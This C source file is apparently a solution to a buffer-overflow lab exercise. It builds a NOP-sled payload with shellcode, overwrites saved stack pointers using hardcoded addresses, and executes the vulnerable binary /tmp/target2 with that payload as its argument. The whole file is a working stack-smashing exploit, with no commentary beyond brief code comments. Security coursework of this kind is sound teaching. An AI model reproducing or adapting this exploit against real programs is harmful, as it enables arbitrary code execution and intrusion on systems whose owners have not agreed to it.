#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NULL_TERM 1
#define PAYLOAD_SIZE (200+NULL_TERM)
#define NOP (0x90)
#define BUF_START (0xbffffc90)
#define NEW_EBP (0xbffffd00)
#define OFFSET ((NEW_EBP & 0xfff)-(BUF_START & 0xfff))
#define NEW_ESP (0xbffffffa)

int main(void)
{
    char *args[3];
    char *env[1];

    char payload[PAYLOAD_SIZE];

    /* Build payload */
    memset(payload, NOP, PAYLOAD_SIZE);
    payload[PAYLOAD_SIZE-1] = '\0';
    *(int *)(payload+OFFSET)=NEW_ESP;
    *(int *)(payload+OFFSET+4)=NEW_EBP+4+4;
    memcpy(payload+OFFSET+4+4, shellcode, strlen(shellcode));


    args[0] = TARGET;
    args[1] = payload;
    args[2] = NULL;
    env[0] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
